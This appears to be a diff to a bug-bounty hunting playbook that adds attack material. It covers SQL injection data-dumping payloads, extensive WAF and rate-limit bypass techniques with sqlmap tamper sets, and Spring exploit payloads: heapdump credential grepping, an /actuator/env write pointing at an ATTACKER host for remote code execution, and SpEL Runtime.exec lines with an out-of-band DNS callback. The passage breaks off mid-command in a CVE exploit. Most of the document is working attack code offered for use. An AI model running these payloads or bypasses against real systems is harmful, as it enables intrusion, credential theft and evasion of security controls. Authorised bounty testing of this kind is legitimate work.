@@ -150,6 +150,21 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ' UNION SELECT 'a',NULL,NULL--
 ```
 
+### Fingerprint + Prove Readable Data (read-only PoC)
+```sql
+-- pick DBMS by stack: .asp/IIS→MSSQL, .php→MySQL, Java/Python→PG/Oracle
+-- column count first:  ' ORDER BY 1--  ↑ until error = N-1 cols
+0' UNION SELECT NULL,'MARKER',NULL--               -- find a displayable column
+-- fingerprint + identity (ONE readable value = valid finding):
+0' UNION SELECT NULL,@@version,NULL--              -- MSSQL/MySQL
+0' UNION SELECT NULL,version(),NULL--              -- PostgreSQL
+0' UNION SELECT NULL,SYSTEM_USER,NULL--            -- MSSQL (current_user / USER() elsewhere)
+-- schema walk + one-request dump of a sensitive table:
+0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--   -- MySQL/MSSQL/PG (Oracle: ALL_TABLES)
+-- MySQL GROUP_CONCAT() · MSSQL/PG STRING_AGG() · Oracle LISTAGG()  → dump in one request
+```
+Reading a credentials/config table is a valid standalone finding — submit on data, not a 500. (DB→OS escalation only if the DB user is sysadmin/superuser AND host exec is in scope.)
+
 ### Blind SQLi (time-based confirmation)
 ```sql
 # MySQL
@@ -272,6 +287,8 @@ token = f"{header}.{payload}."
 # Secret bruteforce
 hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
 ```
+
+> **Non-JWT encrypted session cookies / ViewState / opaque auth blobs?** If decoded length is a multiple of 8 or 16 and a 1-byte flip returns HTTP 500, test for CBC padding oracle — see web2-vuln-classes **Padding Oracle & Crypto Misuse** for PadBuster recipe and ViewState-to-RCE chain.
 
 ### OAuth Attacks
 ```bash
@@ -510,6 +527,534 @@ Basic desync          → Capture victim's next request → Read their auth toke
 + Admin user traffic  → Access admin as victim
 + Cache poisoning     → Stored XSS at scale for all users
 ```
+
+---
+
+## WAF BYPASS REFERENCE
+
+WAF bypass techniques compiled from disclosed bug bounty reports, PortSwigger, PayloadsAllTheThings, and public security research.
+
+### Soft Block Detection (200 OK ≠ Bypass)
+
+WAF vendors often return **HTTP 200 OK with a block page** to confuse attackers:
+- Cloudflare JS challenge: `200 OK` + `cf-challenge-form` body
+- F5 BIG-IP: `200 OK` + "The requested URL was rejected" + `Support ID: xxxx`
+- Imperva: `200 OK` + CAPTCHA page + `_Incapsula_Resource`
+- Custom enterprise WAFs: `200 OK` + "Your request has been blocked. Log ID: WAF-..."
+- AWS + CloudFront custom error pages: may return `200` or `403` depending on config
+
+**Verdict system in `tools/bypass_403.sh`:**
+
+| Verdict | Meaning | Action |
+|---|---|---|
+| `bypassed` | Status OK + body diverges from block baseline + no vendor signature | Escalate endpoint |
+| `needs_review` | Ambiguous — status looks OK but body unclear | Manual check required |
+| `blocked` | Body matches block signature OR length ≈ block baseline | Keep trying |
+
+**401 and 500 are POSITIVE bypass signals:**
+- `401 Unauthorized` = you reached the auth middleware (past WAF edge)
+- `500 Internal Server Error` = payload triggered backend exception (SQLi/SSTI lead)
+- `502/503` = you reached origin (WAF forwarded the request)
+
+**Block baseline:** `bypass_403.sh` samples the target host with a known-bad XSS payload (`/?_waftest=<script>...`) before running probes. It stores the block response length. A bypass probe is only confirmed if:
+1. Status ∈ {200, 201, 204, 301, 302, **401, 500, 502, 503**}
+2. Body does NOT match vendor block signatures
+3. Body length diverges from block baseline by >5%
+
+**WAF Log IDs — also extract them:**
+
+| WAF | Log ID Location | Value for Hunting |
+|---|---|---|
+| Cloudflare | `CF-Ray: 8a3b...-NRT` | PoP code = origin region hint |
+| F5 BIG-IP | Body: `Support ID: 1234567890123456789` | Timestamp encoded in prefix |
+| ModSecurity | Body: `[id "942100"]` | **Rule ID = tells you exactly which rule fired** |
+| Imperva | Body: `incident ID: 12345-6789` | Sequence gap = traffic volume |
+| AWS | Header: `X-Amzn-Trace-Id: Root=1-<hex-ts>-...` | Timestamp in hex |
+| Generic | Body: `Log ID: WAF-20240512-xxxx` | Include in bug report for triage |
+
+Log IDs extracted by `tools/bypass_403.sh` and `tools/waf_response_analyzer.py --classify`. Include them in reports — triage can verify directly from internal WAF logs.
+
+### 403 Bypass Quick Reference
+
+| Category | Technique | Payload Example |
+|---|---|---|
+| IP spoofing | X-Forwarded-For | `X-Forwarded-For: 127.0.0.1` |
+| IP spoofing | True-Client-IP | `True-Client-IP: 127.0.0.1` |
+| IP spoofing | CF-Connecting-IP | `CF-Connecting-IP: 127.0.0.1` |
+| IP spoofing | X-Originating-IP | `X-Originating-IP: 127.0.0.1` |
+| IP spoofing | X-ProxyUser-Ip | `X-ProxyUser-Ip: 127.0.0.1` |
+| IP spoofing | Client-IP | `Client-IP: 127.0.0.1` |
+| IP spoofing | Forwarded RFC 7239 | `Forwarded: for=127.0.0.1` |
+| IP spoofing | X-Remote-Addr | `X-Remote-Addr: 127.0.0.1` |
+| IP spoofing | X-Remote-IP | `X-Remote-IP: 127.0.0.1` |
+| IP spoofing | Via | `Via: 1.1 127.0.0.1` |
+| URL rewrite | X-Original-URL | `X-Original-URL: /admin` |
+| URL rewrite | X-Rewrite-URL | `X-Rewrite-URL: /admin` |
+| URL rewrite | X-Forwarded-Host | `X-Forwarded-Host: localhost` |
+| URL rewrite | X-Custom-IP-Authorization | `X-Custom-IP-Authorization: 127.0.0.1` |
+| Method override | X-HTTP-Method-Override | `X-HTTP-Method-Override: GET` |
+| Method tampering | Verb swap | `POST /admin`, `PUT /admin`, `TRACE /admin` |
+| Path encoding | URL-encoded slash | `/admin/%2e/`, `/admin%2F` |
+| Path encoding | Double URL-encoded | `/admin/%252e/`, `/admin%252F` |
+| Path encoding | Unicode overlong | `/admin/%c0%2e/`, `/admin/%c0%af/` |
+| Path tricks | Semicolon | `/admin;/`, `/admin/.;/` |
+| Path tricks | Double-dot semicolon | `/admin/..;/`, `/admin..;/` |
+| Path tricks | Trailing dot/slash | `/admin/.`, `/admin//`, `/.admin` |
+| Path tricks | Whitespace | `/admin%20`, `/admin%09`, `/admin%0a` |
+| Path tricks | Suffix injection | `/admin.json`, `/admin.html`, `/admin.css`, `/admin#` |
+
+### WAF Fingerprint Signatures
+
+| WAF | Indicator |
+|---|---|
+| Cloudflare | `cf-ray:` header, `__cfduid`/`__cf_bm` cookie, "Attention Required" block page |
+| AWS WAF | 403 with `x-amzn-requestid:`, `x-amzn-trace-id:`, `x-amz-cf-id:` headers |
+| Akamai | `akamai-x-*` headers, "Access Denied" + reference number block page |
+| Imperva/Incapsula | `incap_ses_*`, `visid_incap_*` cookies, `X-CDN: Imperva` |
+| ModSecurity | `mod_security` or `NAXSI` in 4xx response body |
+| F5 BIG-IP ASM | `TS01abcdef` style cookie, `F5-TrafficShield` header |
+| Barracuda | `barra_counter_session` cookie |
+| Wordfence | "Generated by Wordfence" in block page |
+| Sucuri | `X-Sucuri-ID` header |
+
+### Vendor-Specific Bypass Table
+
+| WAF | Bypass Vector | How It Works |
+|---|---|---|
+| Cloudflare | `Transfer-Encoding: chunked` + `X-Forwarded-Host: localhost` | Chunked TE confuses CF parser |
+| Cloudflare | Origin IP direct connection | Find via crt.sh/Shodan, bypass WAF entirely |
+| AWS WAF | SQL comment splitting `UN/**/ION SE/**/LECT` | Rule-based scanner misses tokenised payload |
+| AWS WAF | Oversized body (>8KB) | AWS skips inspection on cheap tier |
+| Imperva | Unicode overlong `%c0%2e%c0%2e/admin` | Decoder mismatch with backend |
+| Imperva | Parameter pollution `?id=1&id=2 UNION SELECT` | Inspects first value, backend uses last |
+| F5 BIG-IP | Double-slash path `//admin` | Path normalisation difference |
+| ModSecurity | Encoding stacking (URL + HTML + unicode) | OWASP CRS misses 3+ layer transforms |
+| Akamai | `Pragma: akamai-x-cache-on` debug headers | Forces cache MISS, exposes uncached path |
+
+### Encoding Bypass Reference
+
+| Layer | Original | Encoded | Use Case |
+|---|---|---|---|
+| URL single | `'` | `%27` | Standard URL |
+| URL double | `'` | `%2527` | Decoder runs once on edge |
+| URL triple | `'` | `%25252527` | Aggressive proxy chain |
+| Unicode JS | `'` | `'` | XSS in JS context |
+| HTML decimal | `'` | `&#39;` | Reflected XSS in HTML |
+| HTML hex | `'` | `&#x27;` | Reflected XSS in HTML |
+| SQL comment | `SELECT` | `SE/**/LECT` | MySQL/Postgres tokeniser |
+| MySQL version | `SELECT` | `/*!50000 SELECT*/` | MySQL-only execution |
+| SQL whitespace | ` ` | `/**/`, `%0a`, `%0b`, `+` | Replace space in SQL |
+| SQL operator | `OR` | `\|\|` | Token-class mismatch |
+| SQL operator | `=` | `LIKE` | Avoid `=` token |
+| Base64 XSS | `alert(1)` | `<svg onload=eval(atob('YWxlcnQoMSk='))>` | Bypass keyword filter |
+
+Generate all variants with: `tools/waf_encoder.py "<payload>" --class sqli|xss|generic`
+
+### Content-Type Confusion
+
+| Technique | Effect |
+|---|---|
+| Dual Content-Type headers | Backend picks one, WAF picks the other |
+| `application/json` for form data | WAF JSON rules vs form rules differ |
+| `text/plain` with JSON body | Many WAFs skip text/plain body inspection |
+| `charset=utf-16le` in part | Backend decodes correctly, WAF sees null-byte-padded garbage |
+| Boundary case confusion | `boundary=x; BOUNDARY=y` exploits case-insensitive parser drift |
+
+### Multipart Parser Confusion
+
+| Technique | Effect |
+|---|---|
+| Boundary simplification (`boundary=x`) | Strips WebKit fingerprint, evades boundary-pattern rules |
+| Null-byte in boundary (`--x\x00`) | Some parsers truncate at null, others don't |
+| `Content-Disposition: form-data; name="f"; x=filename="shell.aspx"` | Payload hidden in sub-param |
+| Post-terminator payload (extra part after `--x--`) | Standard parser ignores, lax parser processes |
+| Per-part `Content-Type: image/jpeg` | Content scanner skips binary/image parts |
+| Duplicate `filename=` param | Parser picks first value, scanner sees second |
+| CRLF/LF mix between parts | Strict-CRLF parser breaks, lenient parser continues |
+
+Generate variants with: `tools/multipart_mutator.py --file shell.aspx --field file`
+
+### Origin Server Discovery (Cloudflare Bypass)
+
+```bash
+# Certificate transparency (pre-WAF origin)
+curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u
+
+# Shodan — search by SSL cert subject
+shodan search "ssl.cert.subject.cn:$TARGET"
+
+# Historical DNS records
+curl -s "https://viewdns.info/iphistory/?domain=$TARGET"
+
+# Direct origin: bypass CF entirely
+curl --resolve "$TARGET:443:<origin-ip>" "https://$TARGET/admin"
+```
+
+### Bypass Decision Tree
+
+```
+Got 403?
+├── Run /bypass-403 <url>           (17 headers + 15 paths + 6 methods = 38 probes)
+│   ├── Hit → escalate the endpoint (may be Security Misconfiguration finding)
+│   └── No hit → continue below
+├── Fingerprint WAF (in bypass_403.sh output or wafw00f)
+│   ├── Cloudflare → origin IP discovery + TE+XFH trick
+│   ├── AWS WAF   → /**/ comment split + oversized body
+│   ├── Imperva   → unicode overlong + param pollution
+│   └── F5        → double-slash path + strip TS cookie
+├── Payload blocked? tools/waf_encoder.py "<payload>" --class sqli|xss
+│   └── Try each variant until 200 response
+├── Upload endpoint? tools/multipart_mutator.py --file shell --field f
+│   └── Try all 10 parser-confusion variants
+└── 5 min total, still blocked → kill (5-minute rule)
+```
+
+### Junk Character Injection (Disrupt Tokenizers)
+
+WAFs use tokenizers that split on operators/delimiters. Injecting garbage between tokens breaks the token stream while the backend parser ignores the noise:
+
+```
+<script>+-+-1-+-+alert(1)+-+-</script>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
+/?id=1+un/**/ion+sel/**/ect+1,2--
+```
+
+### Unicode Normalization (NFKD) XSS
+
+Backend normalizes full-width/Unicode chars to ASCII after WAF inspection:
+
+```html
+＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
+<!-- NFKD → <img src=p onerror='prompt(1)'> -->
+
+<marquee onstart=pr۰mpt()>
+<!-- ۰ = Persian digit zero = 'o' under some normalizers -->
+<!-- decoded: pr0mpt() — WAF misses because it's not "prompt" -->
+```
+
+Full-width Unicode characters (U+FF01–U+FF5E) map to ASCII after NFKD normalization. Persian/Arabic digits (۰–۹) can replace Latin digits. Test by sending these and checking if the server normalizes before execution.
+
+### IBM037 / EBCDIC Charset Bypass
+
+IIS decodes `charset=ibm037` (EBCDIC) in POST bodies. WAFs typically only handle UTF-8/ASCII and skip decoding:
+
+```http
+POST /login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded; charset=ibm037
+
+# Body encoded in IBM EBCDIC — WAF cannot read it, IIS decodes it
+```
+
+```python
+# Python: encode payload in ibm037 for the request body
+import urllib.parse
+payload = "username=admin&password=test' OR '1'='1"
+encoded = payload.encode('ibm037')
+# Send encoded bytes in POST body
+```
+
+**Why it works:** The WAF only decodes the body as UTF-8. The payload is invisible to pattern matching. IIS (and some other Windows backends) decode IBM037 natively before passing to the application.
+
+### JSON/XML Parser Differential (WAFFLED 2025)
+
+**JSON — 557 unique bypass variants confirmed against Cloudflare/ModSecurity/GCP Cloud Armor:**
+
+```http
+# No Content-Type header — some WAFs skip inspection entirely
+POST /api/endpoint HTTP/1.1
+Host: target.com
+# (omit Content-Type)
+
+{"username": "admin' OR '1'='1"}
+
+# Null byte between field name and colon — WAF JSON parser breaks
+{"field1"\x00: "payload"}
+
+# Quote replacement (null byte substituted for double quote)
+{\x00field1\x00: "value"}
+```
+
+**XML — 299 unique bypass variants:**
+
+```xml
+<!-- Extra chars at DOCTYPE closure — confuses WAF's parser -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]X>
+<foo>&xxe;</foo>
+
+<!-- UTF-16 encode the entire XML payload -->
+<!-- iconv -f utf-8 -t utf-16 payload.xml > payload_utf16.xml -->
+<!-- Header: Content-Type: text/xml; charset=utf-16 -->
+<!-- WAF sees garbage bytes; XML parser decodes charset correctly -->
+```
+
+### Hop-by-Hop Header Stripping
+
+List headers in `Connection:` to force intermediate proxies to strip them. If the WAF reads these headers for access decisions BEFORE the proxy strips them, the bypass is achieved:
+
+```http
+GET /admin HTTP/1.1
+Host: target.com
+Connection: X-Forwarded-For, Keep-Alive
+X-Forwarded-For: legitimate-IP
+```
+
+The proxy removes `X-Forwarded-For` before the request reaches the backend. Backend sees no XFF → defaults to allowing. WAF already blocked based on real IP, but now the backend has no IP to check.
+
+**Standard hop-by-hop headers (strippable by listing in Connection:):**
+```
+Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization,
+TE, Trailer, Transfer-Encoding
+
+Non-standard but often strippable:
+Authorization, Cookie, X-Forwarded-For, X-Real-IP
+```
+
+**Attack scenario:** WAF allows only trusted IPs via X-Forwarded-For. Forge XFF header + list it in Connection: → proxy strips it → backend trusts the request.
+
+### NGINX / Backend-Specific Path Bypass Characters
+
+Characters that NGINX passes through but the backend treats as a path terminator/separator, causing access control mismatches:
+
+| Backend | NGINX Version | Bypass Chars | Example |
+|---|---|---|---|
+| Node.js/Express | 1.22.0+ | `\xA0` (NBSP) | `/admin\xA0` |
+| Node.js/Express | 1.16.1–1.20.2 | `\xA0`, `\x09`, `\x0C` | `/admin\x09` |
+| Flask/Python | 1.22.0+ | `\x85`, `\xA0` | `/admin\x85` |
+| Flask/Python | 1.16.1–1.20.2 | `\x85`,`\xA0`,`\x1F`,`\x1E`,`\x1D`,`\x1C`,`\x0C`,`\x0B` | `/admin\x0B` |
+| Spring Boot | all | `;` (NGINX 1.20.2+), `\x09` | `/admin;` |
+| PHP-FPM | any | `/index.php` path info | `/admin.php/index.php` |
+
+```bash
+# Node.js backend — NBSP bypass
+curl $'https://target.com/admin\xA0'
+
+# Spring Boot — semicolon separator
+curl 'https://target.com/admin;'
+
+# PHP-FPM — path info bypass
+curl 'https://target.com/admin.php/index.php'
+```
+
+**ModSecurity path confusion:**
+```
+/foo%3f';alert(1);foo=         # %3f = ?, confuses path parser
+/backup%2ebak                  # bypasses .bak extension block rule
+```
+
+**Spring Boot suffix pattern match (< v5.3):**
+```
+/admin.anything               # matches /admin route (useSuffixPatternMatch=true)
+/admin.json
+/admin.html
+```
+
+### Rate Limit Bypass — Endpoint Variation
+
+Counters are often keyed on exact URL. Small variations reset the counter:
+
+```
+/api/v1/login
+/api/v2/login          # different version → different counter key
+/api/v1/Login          # case variation
+/api/v1/login/         # trailing slash
+/api/v1/login%20       # URL-encoded space (decoded by backend, not by counter)
+/api/v1/login?x=1     # added dummy parameter
+/api/v1/login#anchor   # fragment (ignored by server, resets counter)
+```
+
+**Null byte / character variation for email-based counters:**
+```
+/reset-password?email=victim@test.com%00
+/reset-password?email=victim@test.com%0d
+/reset-password?email=victim%2b1@test.com    # Gmail ignores +alias
+/reset-password?email=victim+abc@test.com    # Different string, same inbox
+```
+
+### Rate Limit Bypass — Protocol-Level Techniques
+
+```bash
+# HTTP/2 multiplexing — send 100+ requests in ONE TCP connection
+# WAF/rate limiter counts per connection, not per stream
+# Use Turbo Intruder in Burp (race conditions tab)
+curl --http2-prior-knowledge -d @requests.txt https://target.com/api/otp
+
+# WebSocket upgrade — after upgrade, each message bypasses per-HTTP-request counters
+# Connect once, then flood WS messages through the single persistent connection
+
+# GraphQL aliasing — one HTTP request = N mutation attempts
+{
+  attempt1: login(username: "admin", password: "pass1") { token }
+  attempt2: login(username: "admin", password: "pass2") { token }
+  attempt3: login(username: "admin", password: "pass3") { token }
+  # ... up to 100+ aliases in one request
+}
+
+# gRPC bidirectional streaming — messages are not individual HTTP requests
+# Rate limiter on HTTP layer doesn't see individual gRPC frames
+```
+
+**Timing exploitation:**
+```
+Window reset attack: burst requests timed to arrive just after rate-limit window resets
+  → effectively doubles throughput (burst before reset + burst after)
+
+Slow HTTP: space requests just under detection threshold
+  → ffuf -rate 1 -p 5   (1 req/s, 5s pause)
+```
+
+### SQLmap Tamper Scripts Reference
+
+```bash
+# Single tamper
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment
+
+# Multiple tampers (applied in order left to right)
+sqlmap -u "https://target.com/page?id=1" \
+  --tamper=between,bluecoat,charencode,randomcase,space2comment \
+  --random-agent --delay=2 --level=5 --risk=3
+```
+
+**Complete tamper reference:**
+
+| Script | What It Does | Best For |
+|---|---|---|
+| `apostrophemask` | `'` → UTF-8 full-width `＇` | All |
+| `apostrophenullencode` | `'` → `%00%27` | All |
+| `base64encode` | Base64-encode entire payload | All |
+| `between` | `>` → `NOT BETWEEN 0 AND` | MSSQL/MySQL/Oracle/PG |
+| `bluecoat` | space → `%09` (tab) | MySQL, BlueCoat SGOS |
+| `chardoubleencode` | double URL-encode all chars | All |
+| `charencode` | URL-encode all chars | All |
+| `charunicodeencode` | `%uXXXX` encoding | MSSQL/MySQL/ASP.NET |
+| `commalesslimit` | `LIMIT 2,3` → `LIMIT 3 OFFSET 2` | MySQL |
+| `equaltolike` | `=` → `LIKE` | MSSQL/MySQL |
+| `greatest` | `>` → `GREATEST()` | MySQL/Oracle/PG |
+| `halfversionedmorekeywords` | space → `/*!0` | MySQL |
+| `lowercase` | all keywords lowercase | All |
+| `modsecurityversioned` | `AND` → `/*!12345AND*/` | MySQL + ModSecurity |
+| `modsecurityzeroversioned` | `AND` → `/*!0AND*/` | MySQL + ModSecurity |
+| `multiplespaces` | single space → multiple spaces | All |
+| `nonrecursivereplacement` | `union` → `uniunionon` | All |
+| `overlongutf8` | overlong UTF-8 encoding | All |
+| `percentage` | `select` → `s%e%l%e%c%t` | MSSQL |
+| `randomcase` | `INSERT` → `INseRt` | All |
+| `randomcomments` | insert `/**/` randomly | MySQL |
+| `securesphere` | append `and '0having'='0having'` | All |
+| `space2comment` | space → `/**/` | All |
+| `space2dash` | space → `--\n` | MSSQL/SQLite |
+| `space2hash` | space → `%23\n` | MySQL |
+| `space2mssqlblank` | space → random MSSQL blanks | MSSQL |
+| `space2mysqlblank` | space → random MySQL blanks | MySQL |
+| `space2plus` | space → `+` | All |
+| `space2randomblank` | space → random `%09/%0A/%0C/%0D` | All |
+| `symboliclogical` | `AND` → `%26%26`, `OR` → `\|\|` | All |
+| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` | All |
+| `unmagicquotes` | `'` → `%bf%27` (GBK multi-byte) | MySQL (magic_quotes) |
+| `uppercase` | all keywords uppercase | All |
+| `versionedkeywords` | `union` → `/*!union*/` | MySQL |
+| `xforwardedfor` | add random `X-Forwarded-For` header | All |
+
+**Pre-built combinations by WAF vendor:**
+
+```bash
+# ModSecurity (OWASP CRS)
+--tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,randomcase
+
+# Cloudflare (2025)
+--tamper=space2comment,randomcase,charencode,between
+
+# AWS WAF
+--tamper=between,charencode,chardoubleencode
+
+# Imperva
+--tamper=randomcase,space2comment,equaltolike
+
+# MySQL WAFs (general)
+--tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,
+         halfversionedmorekeywords,versionedkeywords,versionedmorekeywords
+
+# MSSQL WAFs (general)
+--tamper=between,charencode,charunicodeencode,equaltolike,space2comment,
+         space2dash,space2mssqlblank
+
+# Unknown WAF (throw everything)
+--tamper=apostrophemask,base64encode,between,chardoubleencode,charencode,
+         equaltolike,greatest,multiplespaces,nonrecursivereplacement,
+         percentage,randomcase,space2comment,space2plus,unionalltounion,unmagicquotes
+```
+
+### Tool-Specific WAF Evasion Options
+
+**ffuf:**
+```bash
+# Rate control to avoid triggering rate-limit WAF rules
+ffuf -u https://target.com/FUZZ -w wordlist.txt \
+  -rate 50          \   # max 50 req/s
+  -p 0.1-0.5        \   # random delay 100-500ms per request
+  -t 10                 # threads (lower = stealthier)
+
+# Header rotation for WAF bypass
+ffuf -u https://target.com/FUZZ -w wordlist.txt \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
+  -H "Referer: https://target.com/"
+
+# Filter out WAF block responses by size/words
+ffuf -u https://target.com/FUZZ -w wordlist.txt \
+  -fc 403,429       \   # filter 403 and 429 status codes
+  -fw 97            \   # filter responses with 97 words (WAF block page)
+  -fs 512               # filter 512-byte responses (WAF block page size)
+
+# 403 bypass: fuzz the X-Forwarded-For header with IP list
+ffuf -u https://target.com/admin -w ips.txt \
+  -H "X-Forwarded-For: FUZZ" -mc 200
+```
+
+**wfuzz:**
+```bash
+wfuzz -z file,wordlist.txt \
+  --hc 403,429 \
+  -t 5 \                 # 5 threads (lower = less noisy)
+  -s 0.5 \               # 0.5s delay between requests
+  -H "X-Forwarded-For: 127.0.0.1" \
+  https://target.com/FUZZ
+
+# Multiple header injection for 403 bypass
+wfuzz -z file,headers.txt -H "FUZZ" --hc 403 https://target.com/admin
+```
+
+**nuclei:**
+```bash
+# Rate limit WAF evasion
+nuclei -u https://target.com \
+  -rate-limit 10 \         # 10 req/s max
+  -bulk-size 5 \           # 5 hosts per template batch
+  -c 5 \                   # 5 concurrent templates
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "User-Agent: Mozilla/5.0"
+
+# WAF detection first
+nuclei -u https://target.com -t http/technologies/waf-detect.yaml
+
+# Custom headers on all requests
+nuclei -u https://target.com \
+  -H "Referer: https://target.com/" \
+  -H "X-Forwarded-For: 127.0.0.1"
+```
+
+### Burp Suite Extensions for WAF Bypass
+
+| Extension | Function | Source |
+|---|---|---|
+| **nowafpls** | Insert junk at cursor (JSON/XML/URL/multipart/GraphQL) to push past WAF inspection limit | assetnote/nowafpls |
+| **nowafplsV2** | Auto-inject junk for Active Scanner / DAST runs | irwankusuma/nowafplsV2 |
+| **WAF Bypadd** | Pad requests with dummy data to exceed WAF inspection ceiling | PortSwigger/waf-bypadd |
+| **HTTP Smuggler** | CL.TE / TE.CL / TE.TE desync testing | nccgroup/BurpSuiteHTTPSmuggler |
+| **Hackvertor** | In-request encoding transforms (nest URL+HTML+unicode+base64) | PortSwigger BApp Store |
+| **Param Miner** | Discover hidden/undocumented parameters | PortSwigger BApp Store |
+| **IP Rotate** | Rotate source IP via AWS API Gateway | PortSwigger BApp Store |
+| **Chunked Coding Converter** | Transform requests to chunked Transfer-Encoding | BApp Store / c0ny1 |
+| **SAMLRaider** | XSW, signature stripping, XXE in SAML assertions | BApp Store |
 
 ---
 
@@ -836,3 +1381,288 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 /v1
 /v2
 ```
+
+---
+
+---
+
+## FRAMEWORK 1-DAY QUICK-WINS
+
+Enterprise frameworks ship known-CVE footguns. Recon fingerprints the stack — this section bridges fingerprint -> exact detection request -> exploit payload -> severity so a stack match becomes a fast Critical/High instead of a note.
+
+> **Why these pay:** a precise version fingerprint maps to a public CVE, and the PoC is a single request. This is the highest signal-per-minute work in the file — when `httpx`/`nuclei` flag Spring Boot, Tomcat, Confluence, ThinkPHP, etc., come straight here.
+
+> **Before you claim impact:** confirm the running version is actually in the vulnerable range AND land the working PoC (extracted secret, reflected command output, deployed shell). A version banner alone is on the always-rejected list — "looks vulnerable" is N/A. Fingerprint via `Server`/`X-Application-Context` headers, error pages, `/META-INF/MANIFEST.MF`, `*.js.map`, or a `/package.json`/`/composer.json`/`/pom.xml` leak (see Error Disclosure / Debug Endpoints class).
+
+### Quick Routing Table
+
+| Fingerprint signal | Jump to | Best case |
+|---|---|---|
+| `X-Application-Context`, `/actuator`, Whitelabel error page | Spring Boot Actuator | Critical (heapdump secrets / env RCE) |
+| Spring app + reflected expression sink | Spring SpEL | Critical (RCE) |
+| Spring Cloud Gateway + `/actuator/gateway` | Spring Cloud Gateway | Critical (RCE) |
+| Any Java app logging user input (UA, headers) | Log4Shell | Critical (RCE) |
+| Java API echoing JSON, `@type` accepted | Fastjson / Jackson AutoType | Critical (RCE) |
+| `Set-Cookie: PHPSESSID` + `?s=` routing, `think\` in errors | ThinkPHP | Critical (RCE) |
+| Werkzeug traceback / `/console`, `Server: Werkzeug` | Flask / Werkzeug | Critical (RCE) |
+| `Server: Apache-Coyote`, `/manager/html`, `JSESSIONID` | Tomcat Manager | Critical (RCE) |
+| `.action`/`.do` URLs, `Struts` in stack trace | Struts2 OGNL | Critical (RCE) |
+| `/control/main`, `OFBiz` in title/headers | Apache OFBiz | Critical (RCE) |
+| `X-Confluence-Request-Time`, `/wiki`, Atlassian footer | Confluence OGNL | Critical (RCE) |
+
+---
+
+### Spring Boot Actuator (`/actuator/env`, `/heapdump`, `/gateway`)
+
+**Fingerprint:** `X-Application-Context` header, Whitelabel Error Page, `/actuator` returns a JSON link index.
+
+```bash
+# Detection — enumerate exposed actuators (try both old and new base paths)
+for p in env health info heapdump mappings configprops gateway threaddump beans; do
+  for base in /actuator /; do
+    curl -s -o /dev/null -w "%{http_code} ${base}${p}\n" "https://target.com${base}${p}"
+  done
+done
+# 200 on /actuator/env or /actuator/heapdump = lead
+```
+
+**Exploit — heapdump secret extraction (Critical, no auth needed):**
+```bash
+# Download the JVM heap snapshot, then grep live secrets out of it
+curl -s "https://target.com/actuator/heapdump" -o heap.hprof   # often 50-500MB
+strings heap.hprof | grep -iE 'password|secret|aws_|api[_-]?key|jdbc:|authorization|bearer ' | sort -u
+# Heap routinely contains: DB creds, AWS access/secret keys, internal service URLs,
+# Basic-Auth blobs, session tokens. Each extracted live credential = its own finding.
+```
+
+**Exploit — `/env` write -> RCE (Critical, when POST is allowed on older Boot 1.x/2.x):**
+```bash
+# 1. Point a property at an attacker-controlled XML/YAML to trigger remote bean load
+curl -s "https://target.com/actuator/env" -X POST -H "Content-Type: application/json" \
+  -d '{"name":"spring.cloud.bootstrap.location","value":"http://ATTACKER/x.yml"}'
+# 2. /actuator/refresh re-reads it -> deserialization / SpEL -> RCE (eureka-client gadget classic)
+curl -s "https://target.com/actuator/refresh" -X POST
+```
+
+> **Submittable:** an extracted live credential, or proven RCE. **N/A:** `/actuator/health` exposed alone, or `/env` with all values masked as `******`.
+
+---
+
+### Spring SpEL Injection
+
+**Fingerprint:** Spring app reflecting a parameter into an expression sink (route conditions, `@Value`, query builders, error templates).
+
+```bash
+# Detection — math eval differential. ${...} and #{...} are DIFFERENT engines, do not conflate them.
+curl -s "https://target.com/path?x=%23%7B7*7%7D"        # #{7*7} -> 49 = TRUE SpEL (the RCE-capable sink)
+curl -s "https://target.com/path?x=%24%7B7*7%7D"        # ${7*7} -> 49 = property-placeholder reflection ONLY (not full SpEL)
+```
+
+> **⚠️ `${...}` is a trap.** `${7*7}->49` is usually Spring's property-placeholder / error-page reflection, which does **not** evaluate the `T(...)` operator — `${T(java.lang.Runtime)...}` silently fails. Only a **true SpEL sink** (`#{...}`, or `SpelExpressionParser.parseExpression()` on your input) runs the RCE payloads below. Confirm with `#{7*7}` before burning the 5-minute window on `T()` payloads.
+
+**Exploit (Critical, RCE) — needs a true SpEL `#{...}` / parseExpression sink:**
+```java
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})}
+#{T(org.springframework.cglib.core.ReflectUtils).defineClass(...)}            // bypass when Runtime blocked
+// DNS-confirm RCE when no output reflection:
+#{T(java.net.InetAddress).getByName('OUTPUT.attacker.oast.site')}
+```
+
+> **Submittable:** reflected `id`/`whoami` output or an OAST DNS hit you control via a `#{}`/SpEL sink. **N/A:** `49` reflection alone (especially `${}`-only) with no working `T()` execution — that is just expression reflection, keep digging to a real SpEL sink + RCE.
+
+---
+
+### Spring Cloud Gateway — SpEL Code Injection (CVE-2022-22947)
+
+**Fingerprint:** Spring Cloud Gateway 3.0.0–3.0.6 / 3.1.0 with the `gateway` actuator exposed.
+
+```bash
+curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/actuator/gateway/routes"   # 200 = exposed
+```
+
+**Exploit (Critical, unauthenticated RCE):**
+```bash
+# 1. Add a route whose filter contains a SpEL payload
+curl -s -X POST "https://target.com/actuator/gateway/routes/poc" \
